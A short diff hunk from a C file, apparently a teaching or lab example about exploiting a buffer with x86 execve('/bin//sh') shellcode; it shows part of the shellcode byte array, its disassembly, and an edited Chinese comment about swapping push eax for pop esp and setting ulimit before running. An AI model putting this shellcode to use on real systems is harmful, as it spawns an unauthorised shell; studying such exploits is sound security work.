@@ -15,7 +15,7 @@ char sc[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
   13:   b0 0b                   mov    al, 0xb
   15:   cd 80                   int    0x80
 */
-// 为避免栈空间下移覆盖掉shellcode，我们将f偏移处的push eax改成pop esp
+// 为避免栈空间下移覆盖掉shellcode，我们将f偏移处的push eax改成pop esp（运行之间先设置ulimit -s unlimited)
 
 void shellcode(){
         // a buffer we are about to exploit!
